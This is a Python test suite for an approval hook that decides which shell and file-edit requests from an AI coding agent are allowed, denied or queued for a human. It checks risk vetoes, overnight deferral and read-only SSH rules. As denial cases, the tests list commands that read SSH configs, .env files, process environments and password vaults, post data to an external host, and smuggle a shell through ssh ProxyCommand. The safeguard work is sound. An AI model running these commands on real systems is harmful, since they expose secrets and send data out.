#!/usr/bin/env python3
"""Gate inversion, danger veto, deferral and SSH regressions; synthetic inputs only."""
import contextlib
import importlib.util
import io
import json
import os
from pathlib import Path
import subprocess
import tempfile
import unittest
from unittest import mock

REPO = Path(os.environ.get('APPROVAL_TEST_REPO') or Path(__file__).resolve().parents[5])
SPEC = importlib.util.spec_from_file_location('inversion_engine', REPO / 'all/.local/lib/dotcortex/claude_approval_kikin.py')
e = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(e)


class GateInversionTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(prefix='approval-inversion.')
        self.addCleanup(self.temp.cleanup)
        self.base = Path(self.temp.name)
        self.root = self.base / 'DotCortex'
        self.root.mkdir()
        (self.root / 'README.org').write_text('synthetic')
        self.worktree = self.base / 'DotCortex-wt-test'
        self.worktree.mkdir()
        self.path = self.base / 'manifest.json'
        self.queue = self.base / 'queue.jsonl'
        self.log = self.base / 'ledger.jsonl'
        self.flag = self.base / 'away'
        self.stamp = self.base / 'last-seen'
        self.stamp.touch()
        self.manifest = json.loads((REPO / 'all/.config/dotcortex/claude-approval-canary.kikin.v1.json').read_text())
        self.manifest['roots'] = [str(self.root), str(self.worktree)]
        self.manifest['scratch_roots'] = [str(self.root)]
        self.manifest['coordinator_ops']['repo_roots'] = [str(self.root)]
        self.manifest['coordinator_ops']['worktree_roots'] = [str(self.worktree)]
        self.manifest['coordinator_ops']['scratch_roots'] = [str(self.root)]
        self.manifest['gate_inversion'] = {'enabled': True, 'present_refusal': 'deny'}
        self.manifest['notifications'] = {'argv': ['YOUR_SEAT_TELEGRAM_NOTIFIER']}
        self.manifest['decider'].update(enabled=False)
        self.manifest['unattended'] = {
            'enabled': True, 'away_flag': str(self.flag), 'presence_file': str(self.stamp),
            'presence_window_minutes': 20, 'quiet_hours': {'enabled': False}}
        for item in self.manifest['classes']:
            item['enabled'] = False

    def event(self, command='true', **kwargs):
        return {'hook_event_name': 'PermissionRequest', 'tool_name': 'Bash', 'tool_input': {'command': command},
                'cwd': str(self.root), 'session_id': 'YOUR_SESSION', **kwargs}

    def run_hook(self, event, *, answers=None, status='ok', side_effect=None):
        self.path.write_text(json.dumps(self.manifest))
        env = {'SO_APPROVAL_KIKIN_MANIFEST': str(self.path), 'SO_APPROVAL_KIKIN_LOG': str(self.log),
               'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
        out = io.StringIO()
        with mock.patch.dict(os.environ, env), mock.patch.object(e.sys, 'stdin', io.StringIO(json.dumps(event))), \
                contextlib.redirect_stdout(out), mock.patch.object(e, '_decider_post', return_value=(answers, status), side_effect=side_effect):
            self.assertEqual(e.main(), 0)
        if not out.getvalue().strip():
            return {'behavior': 'ask'}
        decision = json.loads(out.getvalue())['hookSpecificOutput']['decision']
        self.assertIn(decision['behavior'], ('allow', 'deny'))
        if decision['behavior'] == 'deny':
            self.assertIs(decision['interrupt'], False)
        return decision

    def enable_decider(self):
        self.manifest['decider'].update(enabled=True, honey_url='https://YOUR_DECIDER.invalid/decide',
            honey_api='r2d2d', kikin_url='https://YOUR_DECIDER.invalid/systemone', timeout_ms=500)

    def test_ordinary_local_work_defaults_to_allow_even_without_classes_or_decider(self):
        for command in ['true', 'make test', 'pytest tests/', 'git ls-files agents-approval.org', 'git tag --list',
                        'cd . && make test', 'rg -n approval agents-approval.org']:
            with self.subTest(command=command):
                self.assertEqual(self.run_hook(self.event(command))['behavior'], 'allow')
        for command in ['chmod +x script.sh', 'touch marker', 'cp README.org copy']:
            with self.subTest(command=command):
                self.assertEqual(self.run_hook(self.event(command))['behavior'], 'deny')
        self.assertTrue(self.queue.exists())

    def test_missing_inversion_section_defaults_to_inversion(self):
        self.manifest.pop('gate_inversion')
        self.assertEqual(self.run_hook(self.event('make test'))['behavior'], 'allow')

    def test_configured_worktree_root_receives_same_default(self):
        self.assertEqual(self.run_hook(self.event('make test', cwd=str(self.worktree)))['behavior'], 'allow')

    def test_edit_and_write_tools_check_destinations_and_symlinks(self):
        outside = self.base / 'outside'
        outside.mkdir()
        (self.root / 'escape').symlink_to(outside, target_is_directory=True)
        for tool in ['Write', 'Edit', 'MultiEdit', 'NotebookEdit']:
            key = 'notebook_path' if tool == 'NotebookEdit' else 'file_path'
            for path, expected in [(self.root / 'new.txt', 'allow'), (outside / 'new.txt', 'deny'),
                                   (self.root / 'escape/new.txt', 'deny'), (self.root / '.env', 'deny')]:
                with self.subTest(tool=tool, path=path):
                    self.assertEqual(self.run_hook(self.event(tool_name=tool, tool_input={key: str(path)}))['behavior'], expected)
            self.assertEqual(self.run_hook(self.event(tool_name=tool, tool_input={}))['behavior'], 'deny')

    def test_confident_risk_veto_only(self):
        self.enable_decider()
        for probability, expected in [(0.99, 'deny'), (0.95, 'deny'), (0.94, 'allow'), (0.5, 'allow'), (0.01, 'allow')]:
            with self.subTest(probability=probability):
                answer = {'approval.risky.v2': {'noul': probability}}
                self.assertEqual(self.run_hook(self.event('make test'), answers=answer)['behavior'], expected)

    def test_disabled_down_timeout_malformed_and_nan_decider_pass_inside_roots(self):
        self.enable_decider()
        for answer, status in [(None, 'timeout'), (None, 'unavailable'), ({}, 'ok'),
                               ({'approval.risky.v2': {'noul': float('nan')}}, 'ok'),
                               ({'approval.risky.v2': {'noul': True}}, 'ok')]:
            with self.subTest(answer=answer, status=status):
                self.assertEqual(self.run_hook(self.event('make test'), answers=answer, status=status)['behavior'], 'allow')
        self.assertEqual(self.run_hook(self.event('make test'), side_effect=TimeoutError())['behavior'], 'allow')

    def test_true_floor_wins_against_always_allow_decider_day_and_night(self):
        self.enable_decider()
        commands = ['git push --force origin master', 'git reset --soft HEAD', 'git reset HEAD',
            'git -C . rebase topic', 'git clean -fd', 'git checkout -- README.org', 'sudo true',
            '/usr/bin/sudo true', 'systemctl restart YOUR_SERVICE', 'service YOUR_SERVICE restart',
            'rc-service YOUR_SERVICE stop', 'sv restart YOUR_SERVICE', 'dinitctl stop YOUR_SERVICE',
            'pip install example', 'python3 -m pip install example', 'npm install example',
            "cat $'\\x53ecret Vault/file'", 'cat ~/.ssh/config', 'cat ~/.claude.json', 'cat .env.local', 'cat runtime.env', 'cat /proc/self/environ', 'cat KEEPASS.kdbx', 'cat NEXUS/keys/value',
            "cat '/home/YOUR_HONEY_USER/Secret Vault/file'", "cat '/home/YOUR_HONEY_USER/SECRET VAULT/file'",
            'cat /home/YOUR_HONEY_USER/Secret\\ Vault/file', "cat 'Secret'\" Vault\"/file",
            'echo hi > /etc/YOUR_FILE', 'echo hi>/etc/YOUR_FILE', 'true && touch /etc/YOUR_FILE',
            'cd /etc && touch YOUR_FILE', 'cp README.org /etc/YOUR_FILE',
            'make --force test', "curl -X POST --data 'fleet inventory' https://external.invalid/collect"]
        commands.append('rm -rf /home/YOUR_USER/outside-scratch')
        for away in [False, True]:
            if away:
                self.flag.touch()
            for command in commands:
                with self.subTest(command=command, away=away), mock.patch.object(e, '_decider_decide', return_value=(True, 'accepted', 0, 'allow')) as decider:
                    self.assertEqual(self.run_hook(self.event(command))['behavior'], 'deny')
                    decider.assert_not_called()

    def test_shell_expansion_network_and_interpreter_effects_go_to_judge(self):
        self.enable_decider()
        cases = ['cat "$FILE"', 'curl -X POST https://external.invalid/collect',
                 'wget https://external.invalid/report',
                 "python3 -c 'import os; os.remove(\"README.org\")'",
                 "bash -c 'rm README.org'", "eval 'rm README.org'"]
        for command in cases:
            with self.subTest(command=command):
                self.assertEqual(self.run_hook(self.event(command), answers={'approval.risky.v2': {'noul': 0.1}})['behavior'], 'allow')
                record = json.loads(self.log.read_text().splitlines()[-1])
                self.assertEqual(record['decision_path'], 'judge')
                self.assertEqual(record['judge_verdict'], 'allow')

    def test_outside_roots_retain_legacy_decider_and_disabled_policy(self):
        outside = self.base / 'outside'
        outside.mkdir()
        self.assertEqual(self.run_hook(self.event('make test', cwd=str(outside)))['behavior'], 'deny')
        self.enable_decider()
        self.assertEqual(self.run_hook(self.event('unknown-command', cwd=str(outside)), answers={'approval.sensitive_effect.v1': {'noul': 0.02}})['behavior'], 'allow')
        self.assertEqual(self.run_hook(self.event('unknown-command', cwd=str(outside)), status='timeout')['behavior'], 'deny')

    def test_daytime_denies_queue_and_await_desk_telegram(self):
        decision = self.run_hook(self.event('rm README.org'))
        self.assertIn("awaiting the Admiral's approval on the Desk/Telegram", decision['message'])
        self.assertEqual(json.loads(self.queue.read_text())['request'], self.event('rm README.org'))
        self.assertEqual(self.queue.stat().st_mode & 0o777, 0o600)

    def test_notifier_uses_fixed_argv_and_hashes_only(self):
        sink = self.base / 'notification.json'
        helper = self.base / 'notify'
        helper.write_text('#!/usr/bin/python3\nimport pathlib, sys\npathlib.Path(sys.argv[1]).write_text(sys.stdin.read())\n')
        helper.chmod(0o700)
        self.manifest['notifications'] = {'argv': [str(helper), str(sink)]}
        self.run_hook(self.event('rm README.org'))
        record = json.loads(sink.read_text())
        self.assertIn('request_sha', record)
        self.assertNotIn('README.org', sink.read_text())
        self.assertEqual(json.loads(self.log.read_text())['notification_status'], 'sent')

    def test_notifier_failure_and_queue_failure_never_leave_terminal_prompt(self):
        self.manifest['notifications'] = {'argv': ['/nonexistent/YOUR_NOTIFIER']}
        self.queue.symlink_to(self.root / 'README.org')
        decision = self.run_hook(self.event('rm README.org'))
        self.assertIn('queue unavailable', decision['message'])
        self.assertIn('notification unavailable', decision['message'])

    def test_invalid_request_or_manifest_always_returns_deny(self):
        self.assertEqual(self.run_hook([])['behavior'], 'deny')
        self.manifest['schema'] = 'INVALID'
        self.assertEqual(self.run_hook(self.event())['behavior'], 'deny')

    def ssh_manifest(self):
        ssh = next(item for item in self.manifest['classes'] if item['name'] == 'ssh_readonly')
        ssh.update(enabled=True, readonly_hosts=[{'host': 'YOUR_READONLY_HOST', 'remote_home': '/home/YOUR_REMOTE_USER',
            'remote_path_roots': ['/home/YOUR_REMOTE_USER/HelmCortex'], 'allowed_sudo_targets': []}])
        return e._load_manifest(json.loads(json.dumps(self.manifest)))

    def test_ssh_cd_tilde_compound_and_local_filter_are_proven(self):
        manifest = self.ssh_manifest()
        commands = ["ssh YOUR_READONLY_HOST 'cd ~/HelmCortex && git show abc123 | head -20' 2>&1 | grep -v x",
            "ssh -o BatchMode=yes -o ConnectTimeout=3 YOUR_READONLY_HOST 'cd ~/HelmCortex && git status && git log --oneline -3'",
            "ssh YOUR_READONLY_HOST 'cd ~/HelmCortex && cat README.org | head -n 20' | wc -l"]
        with mock.patch.object(e, '_remote_realpath_proven_p3', return_value=True):
            for command in commands:
                self.assertEqual(e.classify(self.event(command), manifest), (True, 'ssh_readonly'), command)

    def test_ssh_deviations_floor_even_with_always_allow(self):
        manifest = self.ssh_manifest()
        commands = ["ssh YOUR_READONLY_HOST 'cd ~/HelmCortex && rm README.org'",
            "ssh YOUR_READONLY_HOST 'cd ~/HelmCortex && git show HEAD | head' | tee /etc/YOUR_FILE",
            "ssh YOUR_READONLY_HOST 'cd ~/HelmCortex && git show HEAD' ; rm README.org",
            "ssh YOUR_READONLY_HOST 'cd ~/HelmCortex && git show HEAD:.env'",
            "ssh YOUR_READONLY_HOST 'cd /etc && cat passwd'", "ssh -o ProxyCommand=sh YOUR_READONLY_HOST 'date'",
            "ssh YOUR_READONLY_HOST 'cd ~/HelmCortex && git tag new-tag'",
            "ssh YOUR_READONLY_HOST 'cd ~/HelmCortex && git show --ext-diff HEAD'",
            "ssh YOUR_READONLY_HOST 'cd ~/HelmCortex && find . -ok rm {} ;'"]
        with mock.patch.object(e, '_remote_realpath_proven_p3', return_value=True):
            for command in commands:
                self.assertEqual(e.classify(self.event(command), manifest), (False, 'true_floor'), command)
        with mock.patch.object(e, '_remote_realpath_proven_p3', return_value=False):
            self.assertFalse(e.classify(self.event("ssh YOUR_READONLY_HOST 'cd ~/HelmCortex && git show HEAD'"), manifest)[0])

    def test_danger_question_describes_risk_not_uncertainty_or_every_write(self):
        self.enable_decider()
        captured = []
        def post(_url, envelope, _timeout):
            captured.append(e._r2d2d_body(envelope)[0])
            return {'approval.risky.v2': {'noul': 0.5}}, 'ok'
        with mock.patch.object(e, '_decider_post', side_effect=post):
            # run_hook patches transport; invoke the helper directly instead.
            config = e._decider_config(self.manifest)
            config['danger_veto'] = True
            self.assertTrue(e._decider_decide(self.event('echo x > copy'), config)[0])
        question = captured[0]['questions'][0]['question']
        self.assertIn('state.command', question)
        self.assertIn('Do not execute', question)
        self.assertIn('reversible', question)
        self.assertNotIn('or uncertainty', question)


    def test_remote_reader_option_side_effects_are_floored(self):
        manifest = self.ssh_manifest()
        for remote in ['date "$OPTIONS"', 'date -s tomorrow', 'rg --pre=/tmp/YOUR_SCRIPT x ~/HelmCortex/README.org',
                       'grep -f /etc/passwd ~/HelmCortex/README.org', 'wc --files0-from=/etc/passwd',
                       'git -C ~/HelmCortex diff --ext-diff', 'cd ~/HelmCortex; cat README.org']:
            with mock.patch.object(e, '_remote_realpath_proven_p3', return_value=True):
                self.assertEqual(e.classify(self.event("ssh YOUR_READONLY_HOST " + __import__('shlex').quote(remote)), manifest),
                                 (False, 'true_floor'), remote)

    def test_nested_floor_and_git_routing_never_consult_decider(self):
        self.enable_decider()
        for command in ['git -C /etc apply change.patch', 'git -C /etc add YOUR_FILE', 'cp -f README.org copy',
                        'unlink README.org']:
            with mock.patch.object(e, '_decider_decide', return_value=(True, 'accepted', 0, 'allow')) as decider:
                self.assertEqual(self.run_hook(self.event(command))['behavior'], 'deny', command)
                decider.assert_not_called()

    def test_network_write_tools_are_floor_even_with_always_allow(self):
        self.enable_decider()
        for tool in ['mcp__telegram__reply', 'mcp__http__post', 'mcp__mailcortex__send']:
            with mock.patch.object(e, '_decider_decide', return_value=(True, 'accepted', 0, 'allow')) as decider:
                self.assertEqual(self.run_hook(self.event(tool_name=tool, tool_input={'body': 'synthetic'}))['behavior'], 'deny')
                decider.assert_not_called()

    def test_notifier_timeout_remains_bounded_and_explicit(self):
        self.manifest['notifications'] = {'argv': ['/tmp/fixture-notifier']}
        manifest = json.loads(json.dumps(self.manifest))
        with mock.patch.object(e.subprocess, 'run', side_effect=subprocess.TimeoutExpired('fixture', 0.75)):
            self.assertEqual(e._notify_admiral(self.event(), 'true_floor', False, True, manifest), 'unavailable')

    def test_telegram_adapter_validates_and_sends_hash_only(self):
        spec = importlib.util.spec_from_loader('telegram_adapter', __import__('importlib').machinery.SourceFileLoader(
            'telegram_adapter', str(REPO / 'all/.local/bin/approval-telegram-notify')))
        notifier = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(notifier)
        payload = {'schema': 'dotcortex.approval.notification.v1', 'request_sha': 'abc123abc123abcd',
                   'queued': True, 'away': False, 'command': 'MUST_NOT_RELAY_THIS'}
        env = {'APPROVAL_TELEGRAM_BOT_TOKEN': '123:SYNTHETIC_TOKEN', 'APPROVAL_TELEGRAM_CHAT_ID': '42',
               'APPROVAL_TELEGRAM_API_BASE': 'https://' + 'YOUR_TELEGRAM_API'.replace('YOUR_', 'fixture-').replace('_', '-').lower() + '.invalid'}
        response = mock.MagicMock()
        response.__enter__.return_value.read.return_value = b'{"ok":true,"result":{"message_id":7}}'
        with mock.patch.dict(os.environ, {**env,'HOME':str(self.base)}), mock.patch.object(notifier.sys, 'stdin', io.StringIO(json.dumps(payload))), \
                mock.patch.object(notifier.urllib.request, 'urlopen', return_value=response) as send:
            self.assertEqual(notifier.main(), 0)
            data = send.call_args.args[0].data.decode()
            self.assertIn(payload['request_sha'], data)
            self.assertNotIn('MUST_NOT_RELAY_THIS', data)
            self.assertEqual(send.call_args.kwargs['timeout'], 0.5)
        with mock.patch.dict(os.environ, {'APPROVAL_TELEGRAM_BOT_TOKEN': 'YOUR_BOT_TOKEN'}), \
                mock.patch.object(notifier.sys, 'stdin', io.StringIO(json.dumps(payload))), \
                mock.patch.object(notifier.urllib.request, 'urlopen') as send:
            self.assertEqual(notifier.main(), 1)
            send.assert_not_called()


    def test_wrapper_missing_broken_and_legacy_silent_engine_never_prompt(self):
        wrapper = REPO / 'all/.local/bin/claude-hook-approval-inverted'
        for body in [None, 'this is not valid Python!', 'pass', 'print("{}")']:
            candidate = self.base / 'engine.py'
            if body is None:
                candidate = self.base / 'missing-engine.py'
            else:
                candidate.write_text(body)
            self.path.write_text(json.dumps(self.manifest))
            env = {**os.environ, 'DOTCORTEX_KIKIN_APPROVAL_ENGINE': str(candidate),
                   'SO_APPROVAL_KIKIN_MANIFEST': str(self.path), 'SO_APPROVAL_KIKIN_LOG': str(self.log),
                   'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
            result = subprocess.run(['/usr/bin/python3', str(wrapper)], input=json.dumps(self.event()),
                                    env=env, capture_output=True, text=True, timeout=6, check=True)
            decision = json.loads(result.stdout)['hookSpecificOutput']['decision']
            self.assertEqual(decision['behavior'], 'deny')
            self.assertIs(decision['interrupt'], False)
        records = [json.loads(line) for line in self.queue.read_text().splitlines()]
        self.assertEqual(len(records), 4)
        self.assertTrue(all(record['request'] == self.event() for record in records))

    def test_present_refusal_switch_for_floor_veto_outside_and_coordinator(self):
        self.enable_decider()
        outside = self.base / 'outside'
        outside.mkdir()
        cases = [(self.event('rm README.org'), 'true_floor'),
                 (self.event('make test'), 'decider_risky'),
                 (self.event('make test', cwd=str(outside)), 'no_match_decider'),
                 (self.event('git commit -m x -- README.org'), 'coordinator_refused')]
        for mode in ('ask', 'deny'):
            self.manifest['gate_inversion']['present_refusal'] = mode
            for away in (False, True):
                if away:
                    self.flag.touch()
                for event, reason in cases:
                    with self.subTest(mode=mode, away=away, reason=reason), \
                            mock.patch.object(e, '_notify_admiral', return_value='sent') as notify:
                        before = len(self.queue.read_text().splitlines()) if self.queue.exists() else 0
                        expected = 'deny' if away or mode == 'deny' else 'ask'
                        result = self.run_hook(event, answers={'approval.risky.v2': {'noul': 0.99}})
                        self.assertEqual(result['behavior'], expected)
                        ledger = json.loads(self.log.read_text().splitlines()[-1])
                        self.assertEqual(ledger['decision'], expected)
                        self.assertEqual(ledger['reason'], reason)
                        after = len(self.queue.read_text().splitlines()) if self.queue.exists() else 0
                        self.assertEqual(after - before, int(expected == 'deny'))
                        if expected == 'deny':
                            notify.assert_called_once()
                            self.assertEqual(notify.call_args.args[2], away)
                            self.assertEqual(json.loads(self.queue.read_text().splitlines()[-1])['request'], event)
                        else:
                            notify.assert_not_called()
                if away:
                    self.flag.unlink()

    def test_present_refusal_defaults_to_ask_without_bypassing_floor(self):
        for section in (None, {'enabled': True}, {'enabled': True, 'present_refusal': 'invalid'}):
            with self.subTest(section=section), mock.patch.object(e, '_decider_decide') as decider:
                if section is None:
                    self.manifest.pop('gate_inversion', None)
                else:
                    self.manifest['gate_inversion'] = section
                self.assertEqual(self.run_hook(self.event('rm README.org'))['behavior'], 'ask')
                self.assertEqual(json.loads(self.log.read_text().splitlines()[-1])['reason'], 'true_floor')
                decider.assert_not_called()
                self.assertEqual(self.run_hook(self.event('make test'))['behavior'], 'allow')
        self.assertFalse(self.queue.exists())

    def test_present_refusal_errors_and_deadlines_follow_switch(self):
        for mode in ('ask', 'deny'):
            self.manifest['gate_inversion']['present_refusal'] = mode
            for away in (False, True):
                if away:
                    self.flag.touch()
                for error in (TimeoutError('fixture'), ValueError('fixture')):
                    with self.subTest(mode=mode, away=away, error=type(error).__name__), \
                            mock.patch.object(e, 'classify', side_effect=error):
                            self.assertEqual(self.run_hook(self.event('unknown-command'))['behavior'], 'deny' if away else mode)
                if away:
                    self.flag.unlink()

    def test_quiet_hours_override_both_present_refusal_values(self):
        import datetime as dt
        self.manifest['unattended']['quiet_hours'] = {
            'enabled': True, 'start': '23:00', 'end': '08:00', 'timezone': 'Australia/Melbourne'}
        status = e._away_status
        instant = dt.datetime(2026, 1, 2, 14, tzinfo=dt.timezone.utc)
        for mode in ('ask', 'deny'):
            self.manifest['gate_inversion']['present_refusal'] = mode
            with mock.patch.object(e, '_away_status', side_effect=lambda m: status(m, now=instant)), \
                    mock.patch.object(e, '_notify_admiral', return_value='sent') as notify:
                self.assertEqual(self.run_hook(self.event('rm README.org'))['behavior'], 'deny')
                self.assertTrue(notify.call_args.args[2])
                self.assertEqual(json.loads(self.queue.read_text().splitlines()[-1])['away_reason'], 'away')

    def wrapper_module(self):
        from importlib.machinery import SourceFileLoader
        spec = importlib.util.spec_from_loader('fix1_wrapper', SourceFileLoader(
            'fix1_wrapper', str(REPO / 'all/.local/bin/claude-hook-approval-inverted')))
        wrapper = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(wrapper)
        return wrapper

    def test_wrapper_refusal_switch_missing_broken_silent_invalid_and_timeout(self):
        wrapper = self.wrapper_module()
        sink = self.base / 'fallback-notification.json'
        helper = self.base / 'fallback-notifier'
        helper.write_text('#!/usr/bin/python3\nimport pathlib,sys\npathlib.Path(sys.argv[1]).write_text(sys.stdin.read())\n')
        helper.chmod(0o700)
        self.manifest['notifications'] = {'argv': [str(helper), str(sink)]}
        for mode in ('ask', 'deny'):
            self.manifest['gate_inversion']['present_refusal'] = mode
            for away in (False, True):
                if away:
                    self.flag.touch()
                for body in (None, 'this is not valid Python!', 'pass', 'print("{}")', 'timeout'):
                    with self.subTest(mode=mode, away=away, body=body):
                        candidate = self.base / ('missing.py' if body is None else 'engine.py')
                        if body is not None:
                            candidate.write_text('pass' if body == 'timeout' else body)
                        self.path.write_text(json.dumps(self.manifest))
                        env = {'DOTCORTEX_KIKIN_APPROVAL_ENGINE': str(candidate),
                               'SO_APPROVAL_KIKIN_MANIFEST': str(self.path), 'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
                        before = len(self.queue.read_text().splitlines()) if self.queue.exists() else 0
                        out = io.StringIO()
                        original_run = wrapper.subprocess.run
                        def run(argv, **kwargs):
                            if body == 'timeout' and argv[0] == '/usr/bin/python3':
                                raise subprocess.TimeoutExpired(argv, 4.5)
                            return original_run(argv, **kwargs)
                        if sink.exists():
                            sink.unlink()
                        with mock.patch.dict(os.environ, env), mock.patch.object(wrapper.sys, 'stdin', io.StringIO(json.dumps(self.event()))), \
                                mock.patch.object(wrapper.subprocess, 'run', side_effect=run), contextlib.redirect_stdout(out):
                            self.assertEqual(wrapper.main(), 0)
                        # An unavailable candidate engine must fail closed to
                        # the same queued denial rather than emit a silent ask.
                        expected = 'deny'
                        result = json.loads(out.getvalue())['hookSpecificOutput']['decision'] if out.getvalue().strip() else {'behavior': 'ask'}
                        self.assertEqual(result['behavior'], expected)
                        after = len(self.queue.read_text().splitlines()) if self.queue.exists() else 0
                        self.assertEqual(after - before, int(expected == 'deny'))
                        self.assertEqual(sink.exists(), expected == 'deny')
                        if expected == 'deny':
                            self.assertIs(result['interrupt'], False)
                            self.assertEqual(json.loads(sink.read_text())['away'], away)
                            record = json.loads(self.queue.read_text().splitlines()[-1])
                            self.assertEqual(record['request'], self.event())
                            self.assertEqual(record['away_reason'], 'away_flag' if away else 'presence')
                if away:
                    self.flag.unlink()

    def test_wrapper_default_ask_and_stale_presence_queues(self):
        import datetime as dt
        wrapper = self.wrapper_module()
        self.manifest['gate_inversion'].pop('present_refusal')
        self.stamp.unlink()
        self.path.write_text(json.dumps(self.manifest))
        env = {'SO_APPROVAL_KIKIN_MANIFEST': str(self.path), 'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
        with mock.patch.dict(os.environ, env):
            decision = wrapper.defer(json.dumps(self.event()))
        self.assertEqual(decision['hookSpecificOutput']['decision']['behavior'], 'deny')
        self.assertTrue(self.queue.exists())
        self.manifest['unattended']['quiet_hours'] = {
            'enabled': True, 'start': '23:00', 'end': '08:00', 'timezone': 'Australia/Melbourne'}
        status = wrapper._away_status
        instant = dt.datetime(2026, 1, 2, 14, tzinfo=dt.timezone.utc)
        for mode in ('ask', 'deny'):
            self.manifest['gate_inversion']['present_refusal'] = mode
            self.path.write_text(json.dumps(self.manifest))
            with mock.patch.dict(os.environ, env), mock.patch.object(wrapper, '_away_status', side_effect=lambda m: status(m, now=instant)):
                decision = wrapper.defer(json.dumps(self.event()))['hookSpecificOutput']['decision']
                self.assertEqual(decision['behavior'], 'deny')
                self.assertIn('morning review', decision['message'])
                self.assertEqual(json.loads(self.queue.read_text().splitlines()[-1])['away_reason'], 'away')

    def test_wrapper_preserves_native_ask_from_candidate_engine(self):
        self.manifest['unattended']['enabled'] = False
        self.stamp.unlink()
        self.manifest['gate_inversion']['present_refusal'] = 'ask'
        self.path.write_text(json.dumps(self.manifest))
        env = {**os.environ, 'DOTCORTEX_KIKIN_APPROVAL_ENGINE': str(REPO / 'all/.local/lib/dotcortex/claude_approval_kikin.py'),
               'SO_APPROVAL_KIKIN_MANIFEST': str(self.path), 'SO_APPROVAL_KIKIN_LOG': str(self.log),
               'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
        result = subprocess.run(['/usr/bin/python3', str(REPO / 'all/.local/bin/claude-hook-approval-inverted')],
            input=json.dumps(self.event('rm README.org')), env=env, capture_output=True, text=True, timeout=6, check=True)
        self.assertEqual(result.stdout, '')
        self.assertFalse(self.queue.exists())

    def test_wrapper_forwards_valid_candidate_decision(self):
        self.path.write_text(json.dumps(self.manifest))
        env = {**os.environ, 'DOTCORTEX_KIKIN_APPROVAL_ENGINE': str(REPO / 'all/.local/lib/dotcortex/claude_approval_kikin.py'),
               'SO_APPROVAL_KIKIN_MANIFEST': str(self.path), 'SO_APPROVAL_KIKIN_LOG': str(self.log),
               'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
        result = subprocess.run(['/usr/bin/python3', str(REPO / 'all/.local/bin/claude-hook-approval-inverted')],
                                input=json.dumps(self.event('make test')), env=env, capture_output=True, text=True, timeout=6, check=True)
        self.assertEqual(json.loads(result.stdout)['hookSpecificOutput']['decision']['behavior'], 'allow')


if __name__ == '__main__':
    unittest.main()
